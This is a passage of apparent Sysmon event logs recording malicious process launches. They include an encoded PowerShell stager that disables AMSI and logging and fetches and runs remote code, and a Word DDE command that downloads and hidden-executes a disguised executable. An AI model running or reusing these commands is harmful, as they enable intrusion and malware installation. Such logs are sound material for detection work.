FsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-8951-59C1-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-8955-59C1-0000-00105DF90100",
      "ParentProcessId": "1956",
      "ProcessGuid": "49F1AF32-8A4D-59C1-0000-001042F00A00",
      "ProcessId": "3888",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "868395",
      "Execution": {
        "ProcessID": "1336",
        "ThreadID": "1876"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-8951-59C1-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-8955-59C1-0000-00105DF90100",
      "ParentProcessId": "1956",
      "ProcessGuid": "49F1AF32-8A86-59C1-0000-0010EB930B00",
      "ProcessId": "1656",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "871621",
      "Execution": {
        "ProcessID": "1336",
        "ThreadID": "1876"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "cmd /c PowerShell \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''%%TMP%%\\Yvfytc.exe'');Start-Process ''%%TMP%%\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath %%TMP%%\\Ryvqma-cgs.bat;Start-Process '%%TMP%%\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
      "Hashes": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",
      "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-590E-59DB-0000-0010049F3000",
      "ParentProcessId": "2848",
      "ProcessGuid": "49F1AF32-5913-59DB-0000-0010023D3100",
      "ProcessId": "1564",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "230841",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "poWERShell -e IAAiACQAKAAgAFMAZQBUAC0AdgBBAHIAaQBhAEIATABlACAAJwBPAEYAcwAnACAAIAAnACcAIAApACIAIAArACAAWwBzAHQAUgBpAG4AZwBdAFsAYwBIAGEAUgBbAF0AXQAgACgAMwA2ACAALAAxADEAOQAgACwAMQAxADUALAA5ADkAIAAsACAAMQAxADQALAAxADAANQAgACwAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMwAyACAALAA2ADEALAAgADMAMgAsADEAMQAwACwAIAAxADAAMQAsACAAMQAxADkALAA0ADUALAAgADEAMQAxACAALAA5ADgALAAgADEAMAA2ACAALAAgADEAMAAxACwAOQA5ACwAMQAxADYAIAAsACAAMwAyACwANAA1ACAALAA2ADcAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAxADEANgAsACAAMwAyACAALAAgADgANwAgACwAOAAzACwAIAA5ADkALAAgADEAMQA0ACAALAAgADEAMAA1ACwAIAAxADEAMgAsACAAMQAxADYAIAAsADQANgAsADgAMwAsACAAMQAwADQALAAgADEAMAAxACwAIAAxADAAOAAgACwAMQAwADgALAA1ADkALAAzADYAIAAsACAAMQAxADkALAAxADAAMQAgACwAOQA4ACAALAAgADkAOQAsADEAMAA4ACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsADEAMQA2ACwAMwAyACwAIAA2ADEAIAAsADMAMgAsADEAMQAwACwAIAAxADAAMQAgACwAMQAxADkALAAgADQANQAgACwAIAAxADEAMQAsADkAOAAsADEAMAA2ACwAIAAxADAAMQAsADkAOQAgACwAMQAxADYAIAAsACAAMwAyACAALAA4ADMALAAxADIAMQAgACwAIAAxADEANQAgACwAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkAIAAsACAANAA2ACAALAAgADcAOAAsADEAMAAxACAALAAgADEAMQA2ACAALAA0ADYAIAAsACAAOAA3ACwAMQAwADEALAAgADkAOAAgACwAIAA2ADcAIAAsADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAAxACAALAAxADEAMAAgACwAMQAxADYAIAAsADUAOQAsACAAMwA2ACwAIAAxADEANAAgACwAOQA3ACwAIAAxADEAMAAgACwAMQAwADAAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsADMAMgAgACwAIAA2ADEALAAgADMAMgAsADEAMQAwACwAMQAwADEALAAxADEAOQAsACAANAA1ACAALAAxADEAMQAgACwAIAA5ADgALAAxADAANgAgACwAIAAxADAAMQAsACAAOQA5ACwAIAAxADEANgAgACwAMwAyACAALAAgADEAMQA0ACAALAAgADkANwAgACwAIAAxADEAMAAgACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsADUAOQAgACwAMwA2ACwAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAgACwAMQAxADUAIAAsADMAMgAgACwAIAA2ADEALAAzADIALAAzADkAIAAsADEAMAA0ACwAMQAxADYALAAxADEANgAsACAAMQAxADIAIAAsADUAOAAgACwAIAA0ADcAIAAsACAANAA3ACAALAA5ADkAIAAsADEAMQA2ACwAMQAwADkAIAAsACAAMQAwADcALAAxADAAMQAgACwAIAAxADEANgAgACwAIAA0ADYAIAAsADkAOQAsACAAMQAxADEAIAAsADEAMAA5ACAALAA0ADcAIAAsACAANwAwACwAMQAxADkALAAgADEAMAAwACwANgA2ACwAMQAwADQAIAAsACAAMQAxADEALAA0ADcALAAgADQANAAsADEAMAA0ACwAIAAxADEANgAgACwAIAAxADEANgAsADEAMQAyACwAIAA1ADgAIAAsADQANwAsADQANwAsACAAMQAxADMALAA0ADUAIAAsACAAMQAxADIAIAAsACAAMQAxADQALAAxADEAMQAsADEAMAAwACAALAAxADEANwAgACwAOQA5ACwAIAAxADEANgAgACwAMQAwADUALAAxADEAMQAsACAAMQAxADAALAAxADEANQAgACwANAA2ACwAOQA5ACwAIAAxADEAMQAgACwAIAAxADAAOQAsADQANwAgACwAIAAxADAANgAsADEAMAA3ACwAOAA4ACAALAAgADcAMgAsADgAMwAsADcANQAsACAAOAAzACAALAA3ADEALAAxADAANgAsACAANAA3ACAALAAgADQANAAsACAAMQAwADQAIAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsADEAMQA2ACwAMQAxADEAIAAsACAAMQAxADEALAAxADAAOAAsADEAMAAzACwAMQAwADEAIAAsACAAMQAwADEAIAAsACAAMQAwADcAIAAsADEAMAAxACwAIAAxADEANAAsADQANgAsADkAOQAgACwAMQAxADEALAAxADAAOQAgACwAIAA0ADcAIAAsADEAMgAxACwAIAA4ADEALAAgADQANwAsACAANAA0ACwAIAAxADAANAAgACwAMQAxADYALAAxADEANgAsADEAMQAyACwANQA4ACAALAA0ADcAIAAsADQANwAgACwAMQAxADEALAAgADEAMQAyACAALAA5ADcALAAxADEANAAgACwAIAA5ADcALAAgADQANgAgACwAIAA5ADkAIAAsACAAMQAxADEAIAAsACAANAA2ACAALAAxADIAMgAsADkANwAgACwANAA3ACAALAAxADAANAAgACwAMQAwADgALAA5ADAALAA4ADcALAAxADEAMgAsACAAMQAxADkAIAAsACAAOAA5ACAALAAgADcAMAAsACAAOAAyACAALAA0ADcAIAAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsACAAMQAxADIALAA1ADgAIAAsACAANAA3ACwANAA3ACAALAAgADEAMAAzACwAMQAxADEALAAxADEAMQAgACwAMQAwADAAIAAsACAAMQAwADkAIAAsADkANwAsADEAMQAwACwAIAAxADEANQAsACAAOQA4ACwAOQA4ACwAIAAxADEAMwAgACwAIAA0ADYALAA5ADkALAAxADEAMQAsACAAMQAwADkALAA0ADcAIAAsADEAMQAzACAALAAgADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAA1ACwAIAA3ADUALAAgADgANQAsADgAMgAsACAAMQAwADUALAAgADQANwAsACAAMwA5ACwANAA2ACwAOAAzACAALAAxADEAMgAgACwAIAAxADAAOAAgACwAMQAwADUALAAxADEANgAsADQAMAAgACwAMwA5ACwANAA0ACAALAAgADMAOQAsADQAMQAsACAANQA5ACwAIAAzADYALAAgADEAMQAwACAALAA5ADcAIAAsACAAMQAwADkAIAAsACAAMQAwADEALAAgADMAMgAgACwAIAA2ADEAIAAsADMAMgAsACAAMwA2ACAALAAgADEAMQA0ACwAOQA3ACwAIAAxADEAMAAsADEAMAAwACAALAAgADEAMQAxACwAIAAxADAAOQAsADQANgAsADEAMQAwACAALAAxADAAMQAsACAAMQAyADAAIAAsACAAMQAxADYAIAAsACAANAAwACAALAA0ADkAIAAsACAANAA0ACAALAAgADMAMgAsACAANQA0ACwAIAA1ADMAIAAsADUAMwAsADUAMQAgACwAIAA1ADQAIAAsACAANAAxACwAIAA1ADkALAAgADMANgAgACwAIAAxADEAMgAgACwAIAA5ADcALAAgADEAMQA2ACwAMQAwADQALAAzADIAIAAsADYAMQAsACAAMwAyACwAMwA2ACAALAAgADEAMAAxACwAIAAxADEAMAAgACwAMQAxADgAIAAsADUAOAAsACAAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkALAAgADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAgACwAIAAzADkAIAAsADkAMgAsACAAMwA5ACAALAAgADMAMgAgACwAIAA0ADMAIAAsACAAMwAyACwAIAAzADYAIAAsACAAMQAxADAALAAgADkANwAsADEAMAA5ACwAIAAxADAAMQAgACwAIAAzADIAIAAsACAANAAzACAALAAzADIAIAAsACAAMwA5ACAALAAgADQANgAgACwAIAAxADAAMQAsADEAMgAwACAALAAgADEAMAAxACAALAAgADMAOQAgACwANQA5ACwAMQAwADIALAAgADEAMQAxACAALAAgADEAMQA0ACAALAAxADAAMQAsACAAOQA3ACAALAAgADkAOQAsADEAMAA0ACAALAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAsADMAMgAsACAAMQAwADUALAAgADEAMQAwACAALAAgADMAMgAsADMANgAgACwAIAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsACAAMQAxADUAIAAsACAANAAxACAALAAgADEAMgAzACAALAAgADEAMQA2ACAALAAgADEAMQA0ACwAIAAxADIAMQAsADEAMgAzACAALAAgADMANgAgACwAMQAxADkALAAgADEAMAAxACwAOQA4ACwAIAA5ADkALAAxADAAOAAsADEAMAA1ACwAMQAwADEALAAgADEAMQAwACAALAAxADEANgAgACwANAA2ACAALAA2ADgALAAgADEAMQAxACAALAAgADEAMQA5ACAALAAxADEAMAAgACwAMQAwADgALAAxADEAMQAgACwAIAA5ADcALAAgADEAMAAwACwAIAA3ADAAIAAsACAAMQAwADUAIAAsADEAMAA4ACAALAAgADEAMAAxACwANAAwACAALAAgADMANgAgACwAIAAxADEANwAsADEAMQA0ACwAIAAxADAAOAAgACwAIAA0ADYAIAAsADgANAAgACwAMQAxADEALAA4ADMAIAAsACAAMQAxADYALAAxADEANAAgACwAIAAxADAANQAgACwAMQAxADAAIAAsACAAMQAwADMALAA0ADAALAA0ADEAIAAsACAANAA0ACAALAAzADIAIAAsACAAMwA2ACAALAAxADEAMgAsADkANwAsADEAMQA2ACAALAAxADAANAAgACwANAAxACAALAAgADUAOQAsACAAOAAzACwAMQAxADYAIAAsACAAOQA3ACwAMQAxADQAIAAsADEAMQA2ACwAIAA0ADUAIAAsACAAOAAwACAALAAgADEAMQA0ACwAMQAxADEAIAAsADkAOQAgACwAIAAxADAAMQAsACAAMQAxADUAIAAsADEAMQA1ACAALAAgADMAMgAsACAAMwA2ACAALAAxADEAMgAsADkANwAgACwAIAAxADEANgAsACAAMQAwADQAIAAsACAANQA5ACAALAAgADkAOAAsACAAMQAxADQAIAAsACAAMQAwADEAIAAsACAAOQA3ACAALAAxADAANwAsACAANQA5ACAALAAxADIANQAgACwAOQA5ACwAIAA5ADcAIAAsACAAMQAxADYAIAAsADkAOQAsACAAMQAwADQALAAxADIAMwAgACwAIAAxADEAOQAgACwAIAAxADEANAAsADEAMAA1ACAALAAgADEAMQA2ACAALAAxADAAMQAsACAANAA1ACwAIAAxADAANAAgACwAIAAxADEAMQAgACwAMQAxADUAIAAsACAAMQAxADYALAAzADIALAAzADYAIAAsACAAOQA1ACwANAA2ACwANgA5ACwAIAAxADIAMAAgACwAIAA5ADkAIAAsACAAMQAwADEAIAAsACAAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMQAwADUALAAgADEAMQAxACAALAAgADEAMQAwACwANAA2ACwAIAA3ADcAIAAsADEAMAAxACwAIAAxADEANQAgACwAMQAxADUALAA5ADcAIAAsADEAMAAzACAALAAgADEAMAAxACAALAAgADUAOQAgACwAIAAxADIANQAgACwAIAAxADIANQApACAAKwAiACQAKAAgAFMARQBUAC0ASQB0AEUATQAgACAAJwBWAEEAcgBpAGEAQgBMAGUAOgBvAGYAcwAnACAAIAAnACAAJwAgACkAIAAiAHwAIAAmACgAKABnAFYAIAAnACoAbQBEAHIAKgAnACkALgBOAEEAbQBlAFsAMwAsADEAMQAsADIAXQAtAEoATwBpAG4AJwAnACkADQAKAA==",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-4730-59DB-0000-0010A9950700",
      "ParentProcessId": "2168",
      "ProcessGuid": "49F1AF32-473C-59DB-0000-001038990800",
      "ProcessId": "2716",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "21915",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "poWERShell -e IAAiACQAKAAgAFMAZQBUAC0AdgBBAHIAaQBhAEIATABlACAAJwBPAEYAcwAnACAAIAAnACcAIAApACIAIAArACAAWwBzAHQAUgBpAG4AZwBdAFsAYwBIAGEAUgBbAF0AXQAgACgAMwA2ACAALAAxADEAOQAgACwAMQAxADUALAA5ADkAIAAsACAAMQAxADQALAAxADAANQAgACwAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMwAyACAALAA2ADEALAAgADMAMgAsADEAMQAwACwAIAAxADAAMQAsACAAMQAxADkALAA0ADUALAAgADEAMQAxACAALAA5ADgALAAgADEAMAA2ACAALAAgADEAMAAxACwAOQA5ACwAMQAxADYAIAAsACAAMwAyACwANAA1ACAALAA2ADcAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAxADEANgAsACAAMwAyACAALAAgADgANwAgACwAOAAzACwAIAA5ADkALAAgADEAMQA0ACAALAAgADEAMAA1ACwAIAAxADEAMgAsACAAMQAxADYAIAAsADQANgAsADgAMwAsACAAMQAwADQALAAgADEAMAAxACwAIAAxADAAOAAgACwAMQAwADgALAA1ADkALAAzADYAIAAsACAAMQAxADkALAAxADAAMQAgACwAOQA4ACAALAAgADkAOQAsADEAMAA4ACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsADEAMQA2ACwAMwAyACwAIAA2ADEAIAAsADMAMgAsADEAMQAwACwAIAAxADAAMQAgACwAMQAxADkALAAgADQANQAgACwAIAAxADEAMQAsADkAOAAsADEAMAA2ACwAIAAxADAAMQAsADkAOQAgACwAMQAxADYAIAAsACAAMwAyACAALAA4ADMALAAxADIAMQAgACwAIAAxADEANQAgACwAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkAIAAsACAANAA2ACAALAAgADcAOAAsADEAMAAxACAALAAgADEAMQA2ACAALAA0ADYAIAAsACAAOAA3ACwAMQAwADEALAAgADkAOAAgACwAIAA2ADcAIAAsADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAAxACAALAAxADEAMAAgACwAMQAxADYAIAAsADUAOQAsACAAMwA2ACwAIAAxADEANAAgACwAOQA3ACwAIAAxADEAMAAgACwAMQAwADAAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsADMAMgAgACwAIAA2ADEALAAgADMAMgAsADEAMQAwACwAMQAwADEALAAxADEAOQAsACAANAA1ACAALAAxADEAMQAgACwAIAA5ADgALAAxADAANgAgACwAIAAxADAAMQAsACAAOQA5ACwAIAAxADEANgAgACwAMwAyACAALAAgADEAM